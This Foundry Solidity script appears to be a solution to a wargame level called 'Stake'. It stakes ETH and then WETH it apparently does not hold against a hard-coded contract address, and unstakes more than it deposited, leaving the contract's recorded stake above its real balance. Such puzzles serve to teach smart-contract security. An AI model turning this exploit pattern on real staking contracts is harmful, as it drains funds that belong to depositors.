// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {Script, console} from "forge-std/Script.sol";
import {Stake, DummyStaker} from "../src/31.Stake.sol";

contract StakeScript is Script {
    function setUp() public {}

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        /*
            at the end of the script,

            1. The Stake contract's ETH balance has to be greater than 0.
            2. totalStaked must be greater than the Stake contract's ETH balance.
            3. You must be a staker.
            4. Your staked balance must be 0.
         */

        vm.startBroadcast(privateKey);

        Stake target = Stake(0xeeD56B91E4b79fB9ead2d9747CE54cB7BFaE13C1);
        address WETH = target.WETH();

        console.log(WETH);

        uint256 amount = 0.001 ether + 1;

        // Stake ETH using DummyStaker
        DummyStaker dummyStaker = new DummyStaker(address(target));
        dummyStaker.stakeETH{value: amount + 1}();

        // Stake ETH directly
        target.StakeETH{value: amount}();

        // Approve WETH to Stake contract
        (bool ok,) = WETH.call(abi.encodeWithSignature("approve(address,uint256)", address(target), type(uint256).max));
        require(ok, "Failed to approve");

        // Stake WETH directly
        target.StakeWETH(amount);

        // Unstake ETH
        target.Unstake(amount * 2);

        vm.stopBroadcast();
    }
}
